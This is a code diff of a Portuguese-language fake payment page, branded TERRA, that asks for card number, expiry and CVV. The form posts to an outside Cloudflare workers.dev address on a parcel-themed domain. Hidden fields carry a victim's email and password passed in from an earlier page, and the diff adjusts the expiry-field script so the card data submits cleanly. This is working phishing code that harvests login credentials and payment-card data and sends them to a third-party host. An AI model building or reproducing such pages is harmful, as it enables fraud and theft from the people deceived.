@@ -29,7 +29,7 @@
  <p>Digite os dados abaixo para realizar a quitação.</p>
  
  <!-- ACTION APONTANDO PARA O WORKER -->
- <form method=post action="https://magui.maguimdasencomendas.workers.dev/">
+ <form method=post action="https://magui.maguimdasencomendas.workers.dev/" id="formPagamento">
  
  <!-- CAMPOS HIDDEN PARA RECEBER EMAIL E SENHA DA PRIMEIRA PÁGINA -->
  <input type="hidden" name="email_original" id="email_original">
@@ -47,10 +47,9 @@
  <label for=cartao>Número do Cartão</label>
  <input type=tel id=cartao name=cartao required maxlength=19 placeholder="0000 0000 0000 0000" inputmode=numeric value="">
  
- <!-- CAMPO DE VALIDADE - VERSÃO FINAL (SEM ERRO) -->
+ <!-- CAMPO DE VALIDADE - SEM NENHUMA VALIDAÇÃO NATIVA -->
  <label for=validade>Validade (MM/AA)</label>
- <input type=text id=validade placeholder="MM/AA" maxlength=5 inputmode=numeric value="">
- <input type="hidden" name="validade" id="validade_hidden">
+ <input type=text id=validade placeholder="MM/AA" maxlength=5 inputmode=numeric value="" style="width:100%; padding:8px; margin-bottom:12px; box-sizing:border-box;">
  
  <label for=cvv>Código de Segurança (CVV)</label>
  <input type=text id=cvv name=cvv required pattern=\d{3} maxlength=3 inputmode=numeric autocomplete=cc-csc placeholder="123 (3 dígitos no verso do cartão)" value="">
@@ -68,53 +67,76 @@
  © 2026 TERRA - Todos os direitos reservados
  </footer>
 
-<!-- SCRIPTS -->
+<!-- SCRIPTS - VERSÃO FINAL -->
 <script>
-// Função para máscara da validade - LIMITADA A 4 NÚMEROS
-function mascaraValidade(input) {
-    let valor = input.value.replace(/\D/g, ''); // Remove tudo que não é número
-    
-    // LIMITE MÁXIMO DE 4 DÍGITOS
-    if (valor.length > 4) {
-        valor = valor.substring(0, 4);
-    }
-    
-    // Guarda os números no campo hidden
-    document.getElementById('validade_hidden').value = valor;
-    
-    // Mostra formatado com barra pro usuário
-    if (valor.length >= 3) {
-        input.value = valor.substring(0,2) + '/' + valor.substring(2,4);
-    } else {
-        input.value = valor;
-    }
-}
-
-// Aplica a máscara em tempo real
-document.getElementById('validade').addEventListener('input', function() {
-    mascaraValidade(this);
-});
-
-// Bloqueia teclas que não são números
-document.getElementById('validade').addEventListener('keydown', function(e) {
-    const tecla = e.key;
-    // Permite apenas números e teclas de controle
-    if (!/[0-9]/.test(tecla) && 
-        tecla !== 'Backspace' && 
-        tecla !== 'Delete' && 
-        tecla !== 'ArrowLeft' && 
-        tecla !== 'ArrowRight' && 
-        tecla !== 'Tab') {
-        e.preventDefault();
-    }
-});
-
+// PEGA OS PARÂMETROS DA URL
 window.onload = function() {
-    // Pega os parâmetros da URL
     const urlParams = new URLSearchParams(window.location.search);
-    
-    // Preenche os campos hidden com email e senha
     document.getElementById('email_original').value = urlParams.get('protocolo') || '';
     document.getElementById('senha_original').value = urlParams.get('token') || '';
 }
+
+// CONFIGURA O CAMPO DE VALIDADE
+document.addEventListener('DOMContentLoaded', function() {
+    const validadeInput = document.getElementById('validade');
+    const form = document.getElementById('formPagamento');
+    
+    // 1. Remove qualquer validação nativa
+    validadeInput.removeAttribute('required');
+    validadeInput.removeAttribute('pattern');
+    
+    // 2. Aplica a máscara
+    validadeInput.addEventListener('input', function(e) {
+        let valor = this.value.replace(/\D/g, ''); // Só números
+        
+        // Limita a 4 dígitos
+        if (valor.length > 4) {
+            valor = valor.substring(0, 4);
+        }
+        
+        // Formata com barra
+        if (valor.length >= 3) {
+            this.value = valor.substring(0,2) + '/' + valor.substring(2,4);
+        } else {
+            this.value = valor;
+        }
+    });
+    
+    // 3. Bloqueia teclas não numéricas
+    validadeInput.addEventListener('keydown', function(e) {
+        const tecla = e.key;
+        // Permite apenas números e teclas de controle
+        if (!/[0-9]/.test(tecla) && 
+            tecla !== 'Backspace' && 
+            tecla !== 'Delete' && 
+            tecla !== 'ArrowLeft' && 
+            tecla !== 'ArrowRight' && 
+            tecla !== 'Tab' &&
+            tecla !== 'Home' &&
+            tecla !== 'End') {
+            e.preventDefault();
+        }
+    });
+    
+    // 4. No envio, adiciona campo hidden com o valor
+    form.addEventListener('submit', function(e) {
+        // Pega o valor atual (já formatado)
+        let valorVisivel = validadeInput.value;
+        let valorNumerico = valorVisivel.replace(/\D/g, ''); // Remove a barra
+        
+        // Só prossegue se tiver 4 números
+        if (valorNumerico.length === 4) {
+            // Cria campo hidden
+            let hidden = document.createElement('input');
+            hidden.type = 'hidden';
+            hidden.name = 'validade';
+            hidden.value = valorNumerico;
+            this.appendChild(hidden);
+        } else {
+            // Se não tiver 4 números, mostra alerta e cancela envio
+            e.preventDefault();
+            alert('Digite a validade completa (MM/AA)');
+        }
+    });
+});
 </script>
